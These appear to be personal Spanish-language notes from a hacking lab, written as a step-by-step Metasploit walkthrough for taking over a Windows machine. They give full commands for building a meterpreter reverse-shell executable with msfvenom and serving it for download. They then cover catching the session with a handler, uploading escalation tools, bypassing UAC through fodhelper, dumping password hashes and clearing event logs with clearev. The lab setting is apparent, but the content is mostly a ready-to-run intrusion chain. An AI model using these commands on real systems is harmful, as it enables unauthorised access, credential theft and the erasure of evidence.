## Hackeo de sistemas

- exploitdb.com : para vulnerabilidades
- El proceso es generar el payload que dejaremos en el equipo win, mientras estoy a la escucha con msfconsole paarq eu cuando clique el payload poder tener acceso al equipo mediante una shell reversa estableciendo la conexión vnc
- Para crear el payload

> msfvenom -p windows/metrpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=10.10.1.13 LPORT=444 -o /home/attack/virus.exe

- Generamos un link para la descarga

> mkdir /var/www/html/share
> chmod -R 755 /var/www/html/share
> chown - R www-data: www-data /var/home/html/share
- Lo copio en una ruta de mi servidor ftp
- Para la escucha

> msfconsole
> use exploit/multi/handler
> show options
> set payload windows/meterpreter/reverse_tcp
> set LHOST 10.10.1.133
> set LPORT 444
> exploit

- Para escalar privilegios uso beroot
- Para acceder a una carpeta con privilegios de root necesito el pass y añadir admin@ a la barra de navegación

> smb://admin@10.10.1.11 //me pide password

- Puedo subir el archivo beroot al equipo windows una vez iniciada la sesión con meterpreter

> upload /home/attack/Desktop/beroot.exe

- Escribo shell para abrir una shell de windws

- Esto lo sube a la carpeta Downloads de windows, lo ejecuto
- Tambie´n puedo usar Gohstpad - compiled binaries, y subir el archivo seatbelt.exe
- Puedo poner otros grupos como remote, para el acceso remoto

> seatbelt.exe -group=system -outputfile="C:\temp\out.txt"

- Descargo el out.txt
- **Ahora, en la shell de meterpreter**
- Para extraer los passwords hasheados

> run post/windows/gather/smart_hashdump

- No hay privilegios suficientes! 
- Para subir privilegios

> getsystem -t 1

- debo dejar la sesión en el background y salir de meterpreter

> background

- En msf uso otro exploit

> use exploit/windows/local/bypassuac_fodhelper
> show options

- Para volver a la sesion anterior
> set SESSION 1

- Uso el mismo payload

> set payload windows/meterpreter/reverse_tcp

- Tengo establecida la sesión y el payload
- Establezco el LHOST y el LPORT con set

> set LHOST 10.10.1.13
> set LPORT 444

> exploit

- Esto abre una segunda sesión

> getsystem -t 1

- Para ver los privilegios que Tengo

> getuid

- YA tenemos privilegios de ADMIN!!
- Ahora puedo hacer uso del hash_dump para obtener los passwords
- Para borrar mis registros

> clearev